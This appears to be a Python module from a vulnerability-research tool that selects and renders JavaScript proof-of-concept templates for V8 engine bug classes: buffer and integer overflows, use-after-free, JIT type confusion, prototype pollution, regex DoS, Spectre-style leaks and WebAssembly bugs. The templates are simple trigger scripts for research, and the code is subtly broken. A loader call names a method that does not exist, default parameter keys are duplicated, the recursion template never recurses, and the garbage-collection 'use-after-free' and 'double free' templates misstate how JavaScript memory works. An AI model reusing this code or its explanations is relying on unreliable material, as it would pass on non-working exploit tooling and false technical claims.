"""
PoC Template Library

Provides vulnerability-specific PoC templates for high-quality generation.
"""

import re
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from pathlib import Path

logger = logging.getLogger(__name__)


@dataclass
class PoCTemplate:
    """Represents a PoC template."""
    name: str
    vuln_type: str
    component: str
    language: str
    code: str
    parameters: List[str]
    description: str
    variants: List[str]


class PoCTemplateLibrary:
    """
    Library of PoC templates for different vulnerability types.
    
    Templates are selected based on:
    1. Vulnerability type
    2. Component
    3. API path
    """
    
    def __init__(self):
        """Initialize template library."""
        self.templates: Dict[str, List[PoCTemplate]] = {}
        self._load_builtin_templates()
    
    def _load_builtin_templates(self):
        """Load built-in templates."""
        # Memory Corruption templates
        self.templates["buffer_overflow"] = [
            self._create_arraybuffer_overflow_template(),
            self._create_typedarray_overflow_template(),
        ]
        
        self.templates["integer_overflow"] = [
            self._create_integer_overflow_template(),
        ]
        
        # Use-After-Free templates
        self.templates["use_after_free"] = [
            self._create_gc_uaf_template(),
        ]
        
        self.templates["double_free"] = [
            self._create_double_free_template(),
        ]
        
        # JIT Optimization templates
        self.templates["type_confusion"] = [
            self._create_jit_type_confusion_template(),
        ]
        
        self.templates["bounds_check_elimination"] = [
            self._create_bounds_check_elimination_template(),
        ]
        
        # Concurrency templates
        self.templates["race_condition"] = [
            self._create_race_condition_template(),
        ]
        
        # Logic Bug templates
        self.templates["prototype_pollution"] = [
            self._create_prototype_pollution_template(),
        ]
        
        self.templates["regex_dos"] = [
            self._create_regex_dos_template(),
        ]
        
        self.templates["stack_overflow"] = [
            self._create_stack_overflow_template(),
        ]
        
        # Side Channel templates
        self.templates["side_channel"] = [
            self._create_side_channel_template(),
        ]
        
        # WebAssembly templates (Phase 4.4)
        self.templates["wasm_memory_overflow"] = [
            self._create_wasm_memory_overflow_template(),
        ]
        
        self.templates["wasm_table_overflow"] = [
            self._create_wasm_table_overflow_template(),
        ]
        
        self.templates["wasm_import_export_confusion"] = [
            self._create_wasm_import_export_confusion_template(),
        ]
        
        self.templates["wasm_jit_bug"] = [
            self._create_wasm_jit_bug_template(),
        ]
        
        logger.info(f"Loaded {self._count_templates()} templates across {len(self.templates)} categories")
    
    def select_template(
        self,
        vuln_type: str,
        component: str = None,
        api_path: List[str] = None
    ) -> Optional[PoCTemplate]:
        """
        Select best matching template.
        
        Args:
            vuln_type: Vulnerability type
            component: Component name
            api_path: API call path
            
        Returns:
            Best matching template or None
        """
        vuln_type_normalized = self._normalize_vuln_type(vuln_type)
        
        # Get templates for this vuln type
        candidates = self.templates.get(vuln_type_normalized, [])
        if not candidates:
            logger.warning(f"No templates for vuln type: {vuln_type}")
            return None
        
        # Score each template
        scored = []
        for template in candidates:
            score = self._score_template(template, component, api_path)
            scored.append((score, template))
        
        # Return highest scoring
        scored.sort(reverse=True, key=lambda x: x[0])
        best_template = scored[0][1] if scored else None
        
        if best_template:
            logger.info(f"Selected template: {best_template.name} (score: {scored[0][0]})")
        
        return best_template
    
    def render_template(
        self,
        template: PoCTemplate,
        parameters: Dict[str, Any]
    ) -> str:
        """
        Render template with parameters.
        
        Args:
            template: Template to render
            parameters: Parameter values
            
        Returns:
            Rendered PoC code
        """
        code = template.code
        
        # Replace parameters
        for param in template.parameters:
            value = parameters.get(param, self._get_default_value(param))
            placeholder = f"{{{param}}}"
            code = code.replace(placeholder, str(value))
        
        return code
    
    # ========== Template Creators ==========
    
    def _create_arraybuffer_overflow_template(self) -> PoCTemplate:
        """Create ArrayBuffer overflow template."""
        return PoCTemplate(
            name="arraybuffer_overflow",
            vuln_type="buffer_overflow",
            component="arraybuffer",
            language="javascript",
            parameters=["buffer_size", "overflow_offset", "overflow_size"],
            description="Buffer overflow via ArrayBuffer operations",
            variants=["negative_offset", "large_offset", "integer_overflow"],
            code="""// PoC for ArrayBuffer Buffer Overflow
// Run with: d8 --allow-natives-syntax poc.js

// Setup: Create ArrayBuffer
const buffer = new ArrayBuffer({buffer_size});
console.log("[+] Created buffer of size: " + buffer.byteLength);

// Trigger: Out-of-bounds access via slice
try {
    const slice = buffer.slice({overflow_offset}, {overflow_size});
    console.log("[!] Slice succeeded (unexpected): " + slice.byteLength);
} catch (e) {
    console.log("[+] Exception caught: " + e);
}

// Alternative trigger: Direct view access
const view = new DataView(buffer);
try {
    view.setUint32({overflow_offset}, 0x41414141);
    console.log("[!] Write succeeded (unexpected)");
} catch (e) {
    console.log("[+] Exception caught: " + e);
}

console.log("[*] PoC complete - check for ASAN errors or crash");
"""
        )
    
    def _create_typedarr_overflow_template(self) -> PoCTemplate:
        """Create TypedArray overflow template."""
        return PoCTemplate(
            name="typedarray_overflow",
            vuln_type="buffer_overflow",
            component="typedarray",
            language="javascript",
            parameters=["array_size", "overflow_index"],
            description="Buffer overflow via TypedArray access",
            variants=["uint8", "uint32", "float64"],
            code="""// PoC for TypedArray Buffer Overflow
// Run with: d8 --allow-natives-syntax poc.js

// Setup: Create TypedArray
const arr = new Uint32Array({array_size});
console.log("[+] Created Uint32Array of length: " + arr.length);

// Fill with pattern
for (let i = 0; i < arr.length; i++) {
    arr[i] = 0x41414141;
}

// Trigger: Out-of-bounds access
const oob_index = {overflow_index};
console.log("[*] Attempting OOB access at index: " + oob_index);

try {
    arr[oob_index] = 0x42424242;
    console.log("[!] OOB write succeeded: " + arr[oob_index]);
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for ASAN errors");
"""
        )
    
    def _create_gc_uaf_template(self) -> PoCTemplate:
        """Create GC Use-After-Free template."""
        return PoCTemplate(
            name="gc_use_after_free",
            vuln_type="use_after_free",
            component="gc",
            language="javascript",
            parameters=["object_count", "trigger_method"],
            description="Use-After-Free via GC manipulation",
            variants=["array_uaf", "object_uaf"],
            code="""// PoC for Use-After-Free via GC
// Run with: d8 --allow-natives-syntax --expose-gc poc.js

// Setup: Create objects
let objects = [];
for (let i = 0; i < {object_count}; i++) {
    objects.push({{data: new Array(1000)}});
}
console.log("[+] Created " + objects.length + " objects");

// Keep reference to one object
let dangling = objects[0];

// Trigger GC to free objects
objects = null;
gc();
console.log("[+] Triggered GC");

// Trigger: Access freed object
console.log("[*] Attempting to access freed object...");
try {
    {trigger_method}
    console.log("[!] Access succeeded (UAF triggered)");
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for ASAN use-after-free");
"""
        )
    
    def _create_jit_type_confusion_template(self) -> PoCTemplate:
        """Create JIT type confusion template."""
        return PoCTemplate(
            name="jit_type_confusion",
            vuln_type="type_confusion",
            component="jit",
            language="javascript",
            parameters=["optimize_iterations", "confusion_trigger"],
            description="Type confusion via JIT optimization",
            variants=["map_confusion", "element_kind_confusion"],
            code="""// PoC for JIT Type Confusion
// Run with: d8 --allow-natives-syntax poc.js

function trigger(arr) {
    // This will be optimized by JIT
    return arr[0];
}

// Setup: Prepare for optimization
console.log("[+] Preparing JIT optimization...");

// Train JIT with consistent type
let arr1 = [1.1, 2.2, 3.3];
for (let i = 0; i < {optimize_iterations}; i++) {
    trigger(arr1);
}

// Force optimization
%PrepareFunctionForOptimization(trigger);
trigger(arr1);
trigger(arr1);
%OptimizeFunctionOnNextCall(trigger);
trigger(arr1);

console.log("[+] Function optimized");

// Trigger: Cause type confusion
{confusion_trigger}

console.log("[*] PoC complete - check for type confusion");
"""
        )
    
    # ========== New Templates (Phase 4.1) ==========
    
    def _create_integer_overflow_template(self) -> PoCTemplate:
        """Create Integer Overflow template."""
        return PoCTemplate(
            name="integer_overflow",
            vuln_type="integer_overflow",
            component="arithmetic",
            language="javascript",
            parameters=["base_value", "overflow_amount"],
            description="Integer overflow leading to allocation size mismatch",
            variants=["addition_overflow", "multiplication_overflow"],
            code="""// PoC for Integer Overflow
// Run with: d8 poc.js

// Setup: Large values that will overflow
const base = {base_value};
const offset = {overflow_amount};

console.log("[+] Base value: " + base);
console.log("[+] Offset: " + offset);

// Trigger: Integer overflow
const total = base + offset;
console.log("[*] Total (after overflow): " + total);

// Attempt allocation with overflowed size
try {
    const buffer = new ArrayBuffer(total);
    console.log("[!] Buffer created with size: " + buffer.byteLength);
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for integer overflow");
"""
        )
    
    def _create_bounds_check_elimination_template(self) -> PoCTemplate:
        """Create Bounds Check Elimination template."""
        return PoCTemplate(
            name="bounds_check_elimination",
            vuln_type="bounds_check_elimination",
            component="jit",
            language="javascript",
            parameters=["train_iterations", "oob_index"],
            description="JIT incorrectly eliminates bounds check",
            variants=["array_access", "typed_array"],
            code="""// PoC for Bounds Check Elimination
// Run with: d8 --allow-natives-syntax poc.js

function oob_read(arr, idx) {
    // JIT will try to eliminate bounds check
    return arr[idx];
}

// Setup: Train JIT with in-bounds accesses
console.log("[+] Training JIT with in-bounds accesses...");
const arr = [1, 2, 3, 4, 5];

for (let i = 0; i < {train_iterations}; i++) {
    oob_read(arr, 2);  // Always in-bounds
}

// Force optimization
%PrepareFunctionForOptimization(oob_read);
oob_read(arr, 2);
oob_read(arr, 2);
%OptimizeFunctionOnNextCall(oob_read);
oob_read(arr, 2);

console.log("[+] Function optimized");

// Trigger: Out-of-bounds access
const oob_idx = {oob_index};
console.log("[*] Attempting OOB read at index: " + oob_idx);

try {
    const value = oob_read(arr, oob_idx);
    console.log("[!] OOB read succeeded: " + value);
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for OOB access");
"""
        )
    
    def _create_prototype_pollution_template(self) -> PoCTemplate:
        """Create Prototype Pollution template."""
        return PoCTemplate(
            name="prototype_pollution",
            vuln_type="prototype_pollution",
            component="object",
            language="javascript",
            parameters=["polluted_property", "polluted_value"],
            description="Pollute Object.prototype to affect all objects",
            variants=["object_prototype", "array_prototype"],
            code="""// PoC for Prototype Pollution
// Run with: d8 poc.js

// Setup: Create clean object
const obj1 = {};
console.log("[+] obj1.{polluted_property} before: " + obj1.{polluted_property});

// Trigger: Pollute Object.prototype
Object.prototype.{polluted_property} = "{polluted_value}";
console.log("[+] Polluted Object.prototype.{polluted_property}");

// Verify: All objects now have the property
const obj2 = {};
console.log("[*] obj1.{polluted_property} after: " + obj1.{polluted_property});
console.log("[*] obj2.{polluted_property}: " + obj2.{polluted_property});

// Check for security impact
if (obj2.{polluted_property} === "{polluted_value}") {
    console.log("[!] Prototype pollution successful!");
}

console.log("[*] PoC complete - check for prototype pollution impact");
"""
        )
    
    def _create_race_condition_template(self) -> PoCTemplate:
        """Create Race Condition template."""
        return PoCTemplate(
            name="race_condition",
            vuln_type="race_condition",
            component="sharedarray",
            language="javascript",
            parameters=["buffer_size", "iterations"],
            description="Race condition via SharedArrayBuffer",
            variants=["read_write_race", "double_write"],
            code="""// PoC for Race Condition
// Run with: d8 --harmony-sharedarraybuffer poc.js

// Setup: Create SharedArrayBuffer
const sab = new SharedArrayBuffer({buffer_size});
const view = new Int32Array(sab);

console.log("[+] Created SharedArrayBuffer of size: " + sab.byteLength);

// Simulate concurrent access (simplified)
// In real scenario, use Web Workers

// Thread 1 simulation: Write
function writer() {
    for (let i = 0; i < {iterations}; i++) {
        view[0] = i;
    }
}

// Thread 2 simulation: Read
function reader() {
    let values = [];
    for (let i = 0; i < {iterations}; i++) {
        values.push(view[0]);
    }
    return values;
}

// Trigger: Concurrent access (race)
console.log("[*] Simulating race condition...");
writer();
const results = reader();

// Check for inconsistent values
const unique = [...new Set(results)];
console.log("[*] Unique values read: " + unique.length);

if (unique.length > 1) {
    console.log("[!] Race condition detected!");
}

console.log("[*] PoC complete - check for race condition");
"""
        )
    
    def _create_double_free_template(self) -> PoCTemplate:
        """Create Double Free template."""
        return PoCTemplate(
            name="double_free",
            vuln_type="double_free",
            component="gc",
            language="javascript",
            parameters=["object_size"],
            description="Object freed twice via GC manipulation",
            variants=["array_double_free", "object_double_free"],
            code="""// PoC for Double Free
// Run with: d8 --allow-natives-syntax --expose-gc poc.js

// Setup: Create object with specific size
let obj = {data: new Array({object_size})};
console.log("[+] Created object with array of size: " + {object_size});

// Create multiple references
let ref1 = obj;
let ref2 = obj;

console.log("[+] Created two references to same object");

// First free
ref1 = null;
gc();
console.log("[+] First GC (ref1 freed)");

// Trigger: Second free
ref2 = null;
gc();
console.log("[*] Second GC (potential double free)");

// Try to trigger use of freed memory
try {
    let newObj = {data: new Array({object_size})};
    console.log("[+] Allocated new object");
} catch (e) {
    console.log("[!] Exception: " + e);
}

console.log("[*] PoC complete - check for double-free");
"""
        )
    
    def _create_stack_overflow_template(self) -> PoCTemplate:
        """Create Stack Overflow template."""
        return PoCTemplate(
            name="stack_overflow",
            vuln_type="stack_overflow",
            component="stack",
            language="javascript",
            parameters=["recursion_depth"],
            description="Stack overflow via deep recursion",
            variants=["infinite_recursion", "mutual_recursion"],
            code="""// PoC for Stack Overflow
// Run with: d8 poc.js

let depth = 0;

function recurse(n) {
    depth++;
    if (depth % 1000 === 0) {
        console.log("[*] Recursion depth: " + depth);
    }
    
    // Trigger: Deep recursion
    if (n > 0) {
        recurse(n + 1);
    }
}

console.log("[+] Starting deep recursion...");

try {
    recurse(0);
} catch (e) {
    console.log("[!] Stack overflow at depth: " + depth);
    console.log("[!] Exception: " + e);
}

console.log("[*] PoC complete - stack overflow triggered");
"""
        )
    
    def _create_regex_dos_template(self) -> PoCTemplate:
        """Create Regex DoS template."""
        return PoCTemplate(
            name="regex_dos",
            vuln_type="regex_dos",
            component="regex",
            language="javascript",
            parameters=["repeat_count"],
            description="Catastrophic backtracking in regex",
            variants=["nested_quantifiers", "alternation"],
            code="""// PoC for Regex DoS
// Run with: d8 poc.js

// Setup: Evil regex with catastrophic backtracking
const evil_input = "a".repeat({repeat_count}) + "X";
const evil_regex = /^(a+)+$/;

console.log("[+] Input length: " + evil_input.length);
console.log("[+] Regex pattern: " + evil_regex);

// Trigger: Catastrophic backtracking
console.log("[*] Testing regex (this may hang)...");

const start = Date.now();
try {
    const result = evil_regex.test(evil_input);
    const elapsed = Date.now() - start;
    
    console.log("[*] Result: " + result);
    console.log("[*] Time elapsed: " + elapsed + "ms");
    
    if (elapsed > 1000) {
        console.log("[!] Regex DoS detected (> 1 second)");
    }
} catch (e) {
    console.log("[!] Exception: " + e);
}

console.log("[*] PoC complete - check for regex DoS");
"""
        )
    
    def _create_side_channel_template(self) -> PoCTemplate:
        """Create Side Channel template."""
        return PoCTemplate(
            name="side_channel",
            vuln_type="side_channel",
            component="speculative",
            language="javascript",
            parameters=["probe_size", "secret_offset"],
            description="Side channel via speculative execution",
            variants=["spectre_v1", "timing_attack"],
            code="""// PoC for Side Channel Attack
// Run with: d8 poc.js

// Setup: Probe array for timing
const probe = new Uint8Array({probe_size});
const arr = new Uint8Array(10);

console.log("[+] Probe array size: " + probe.length);

// Fill probe with zeros
for (let i = 0; i < probe.length; i++) {
    probe[i] = 0;
}

// Trigger: Speculative execution side channel
function leak(offset) {
    // Bounds check (may be bypassed speculatively)
    if (offset < arr.length) {
        // Speculatively executed even if offset is OOB
        const value = arr[offset];
        
        // Create timing side channel
        const probe_idx = value * 256;
        return probe[probe_idx];
    }
}

// Attempt to leak data
const secret_off = {secret_offset};
console.log("[*] Attempting to leak data at offset: " + secret_off);

try {
    const leaked = leak(secret_off);
    console.log("[*] Leaked value: " + leaked);
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for side channel leak");
"""
        )
    
    # ========== Helper Methods ==========
    
    def _normalize_vuln_type(self, vuln_type: str) -> str:
        """Normalize vulnerability type string."""
        normalized = vuln_type.lower().replace(" ", "_").replace("-", "_")
        
        # Map common variations
        mappings = {
            "heap_buffer_overflow": "buffer_overflow",
            "oob": "buffer_overflow",
            "out_of_bounds": "buffer_overflow",
            "uaf": "use_after_free",
            "wasm_memory": "wasm_memory_overflow",
            "wasm_table": "wasm_table_overflow",
            "wasm_import": "wasm_import_export_confusion",
            "wasm_export": "wasm_import_export_confusion",
            "wasm_jit": "wasm_jit_bug",
            "wasm_optimization": "wasm_jit_bug",
        }
        
        return mappings.get(normalized, normalized)
    
    def _score_template(
        self,
        template: PoCTemplate,
        component: str = None,
        api_path: List[str] = None
    ) -> float:
        """Score template match quality."""
        score = 1.0  # Base score
        
        # Component match
        if component and template.component:
            if component.lower() in template.component.lower():
                score += 2.0
        
        # API path match
        if api_path and template.name:
            for api in api_path:
                if api.lower() in template.name.lower():
                    score += 1.0
        
        return score
    
    def _get_default_value(self, param: str) -> str:
        """Get default value for parameter."""
        defaults = {
            # Buffer Overflow
            "buffer_size": "0x10000",
            "overflow_offset": "-1",
            "overflow_size": "10",
            "array_size": "100",
            "overflow_index": "1000",
            
            # UAF / Double Free
            "object_count": "100",
            "trigger_method": "dangling.data[0]",
            "object_size": "1000",
            
            # JIT
            "optimize_iterations": "10000",
            "confusion_trigger": "let arr2 = [{}]; trigger(arr2);",
            "train_iterations": "10000",
            "oob_index": "100",
            
            # Integer Overflow
            "base_value": "0x7fffffff",
            "overflow_amount": "10",
            
            # Prototype Pollution
            "polluted_property": "isAdmin",
            "polluted_value": "true",
            
            # Race Condition
            "iterations": "1000",
            
            # Regex DoS
            "repeat_count": "50",
            
            # Side Channel
            "probe_size": "256 * 256",
            "secret_offset": "100",
            
            # Recursion
            "recursion_depth": "10000",
            
            # WebAssembly (Phase 4.4)
            "memory_pages": "1",
            "overflow_offset": "0x10000",
            "table_size": "10",
            "overflow_index": "100",
            "expected_type": "i32",
            "actual_type": "f64",
        }
        return defaults.get(param, "/* TODO: set " + param + " */")
    
    def _count_templates(self) -> int:
        """Count total templates."""
        return sum(len(templates) for templates in self.templates.values())
    
    def list_templates(self) -> List[str]:
        """List all available templates."""
        result = []
        for vuln_type, templates in self.templates.items():
            for template in templates:
                result.append(f"{vuln_type}/{template.name}")
        return result
    
    # ========== WebAssembly Templates (Phase 4.4) ==========
    
    def _create_wasm_memory_overflow_template(self) -> PoCTemplate:
        """Create WebAssembly Memory Overflow template."""
        return PoCTemplate(
            name="wasm_memory_overflow",
            vuln_type="wasm_memory_overflow",
            component="wasm",
            language="javascript",
            parameters=["memory_pages", "overflow_offset"],
            description="WebAssembly linear memory overflow",
            variants=["memory_grow", "direct_access"],
            code="""// PoC for WebAssembly Memory Overflow
// Run with: d8 --experimental-wasm poc.js

// WebAssembly module with memory
const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, // Magic: \\0asm
    0x01, 0x00, 0x00, 0x00, // Version: 1
    
    // Memory section
    0x05, 0x03, 0x01, 0x00, {memory_pages}, // Memory: initial={memory_pages} pages
    
    // Export section
    0x07, 0x0a, 0x01, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, // Export "memory"
]);

console.log("[+] Creating WebAssembly module with {memory_pages} pages");

try {
    const module = new WebAssembly.Module(wasmCode);
    const instance = new WebAssembly.Instance(module);
    
    // Access memory
    const memory = instance.exports.memory;
    const buffer = new Uint8Array(memory.buffer);
    
    console.log("[+] Memory buffer size: " + buffer.length);
    
    // Trigger: Out-of-bounds access
    const offset = {overflow_offset};
    console.log("[*] Attempting OOB write at offset: " + offset);
    
    buffer[offset] = 0x41;
    console.log("[!] OOB write succeeded");
    
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for WASM memory overflow");
"""
        )
    
    def _create_wasm_table_overflow_template(self) -> PoCTemplate:
        """Create WebAssembly Table Overflow template."""
        return PoCTemplate(
            name="wasm_table_overflow",
            vuln_type="wasm_table_overflow",
            component="wasm",
            language="javascript",
            parameters=["table_size", "overflow_index"],
            description="WebAssembly function table overflow",
            variants=["table_set", "table_get"],
            code="""// PoC for WebAssembly Table Overflow
// Run with: d8 --experimental-wasm poc.js

// Create WebAssembly table
const table = new WebAssembly.Table({
    initial: {table_size},
    element: 'anyfunc'
});

console.log("[+] Created WebAssembly table with size: " + table.length);

// Create a dummy function
function dummyFunc() {
    return 42;
}

// Fill table
for (let i = 0; i < table.length; i++) {
    table.set(i, dummyFunc);
}

// Trigger: Out-of-bounds table access
const oob_index = {overflow_index};
console.log("[*] Attempting OOB table.set at index: " + oob_index);

try {
    table.set(oob_index, dummyFunc);
    console.log("[!] OOB table.set succeeded");
} catch (e) {
    console.log("[+] Exception: " + e);
}

// Try table.get as well
console.log("[*] Attempting OOB table.get at index: " + oob_index);

try {
    const func = table.get(oob_index);
    console.log("[!] OOB table.get succeeded: " + func);
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for WASM table overflow");
"""
        )
    
    def _create_wasm_import_export_confusion_template(self) -> PoCTemplate:
        """Create WebAssembly Import/Export Confusion template."""
        return PoCTemplate(
            name="wasm_import_export_confusion",
            vuln_type="wasm_import_export_confusion",
            component="wasm",
            language="javascript",
            parameters=["expected_type", "actual_type"],
            description="Type confusion via WebAssembly imports/exports",
            variants=["import_confusion", "export_confusion"],
            code="""// PoC for WebAssembly Import/Export Type Confusion
// Run with: d8 --experimental-wasm poc.js

// WebAssembly Text Format (WAT) compiled to binary
// This module expects an import with specific type
const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic + Version
    
    // Type section: function signature
    0x01, 0x05, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f, // (i32) -> i32
    
    // Import section: import function from env
    0x02, 0x0c, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x04, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00,
    
    // Function section
    0x03, 0x02, 0x01, 0x00,
    
    // Export section
    0x07, 0x08, 0x01, 0x04, 0x74, 0x65, 0x73, 0x74, 0x00, 0x01,
    
    // Code section
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x10, 0x00, 0x0b,
]);

console.log("[+] Creating WebAssembly module with imports");

// Provide import with WRONG type
const importObj = {
    env: {
        // Expected: {expected_type}
        // Actual: {actual_type}
        func: (x) => {
            console.log("[*] Import called with: " + x);
            return x + 1;
        }
    }
};

try {
    const module = new WebAssembly.Module(wasmCode);
    const instance = new WebAssembly.Instance(module, importObj);
    
    console.log("[+] Instance created");
    
    // Call exported function
    const result = instance.exports.test(42);
    console.log("[*] Result: " + result);
    
} catch (e) {
    console.log("[+] Exception: " + e);
}

console.log("[*] PoC complete - check for type confusion");
"""
        )
    
    def _create_wasm_jit_bug_template(self) -> PoCTemplate:
        """Create WebAssembly JIT Bug template."""
        return PoCTemplate(
            name="wasm_jit_bug",
            vuln_type="wasm_jit_bug",
            component="wasm",
            language="javascript",
            parameters=["iterations"],
            description="WebAssembly JIT compiler bug",
            variants=["optimization_bug", "miscompilation"],
            code="""// PoC for WebAssembly JIT Bug
// Run with: d8 --experimental-wasm --wasm-opt poc.js

// Simple WebAssembly module
const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic + Version
    
    // Type section: (i32, i32) -> i32
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f,
    
    // Function section
    0x03, 0x02, 0x01, 0x00,
    
    // Export section: export "add"
    0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00,
    
    // Code section: function body
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b,
]);

console.log("[+] Creating WebAssembly module");

const module = new WebAssembly.Module(wasmCode);
const instance = new WebAssembly.Instance(module);

const add = instance.exports.add;

console.log("[+] Warming up JIT with {iterations} iterations");

// Warm up JIT compiler
for (let i = 0; i < {iterations}; i++) {
    add(i, i + 1);
}

console.log("[+] JIT should be optimized now");

// Trigger potential JIT bug
const result1 = add(0x7fffffff, 1); // Integer overflow
const result2 = add(-1, -1);
const result3 = add(0, 0);

console.log("[*] Results:");
console.log("  0x7fffffff + 1 = " + result1);
console.log("  -1 + -1 = " + result2);
console.log("  0 + 0 = " + result3);

console.log("[*] PoC complete - check for JIT miscompilation");
"""
        )
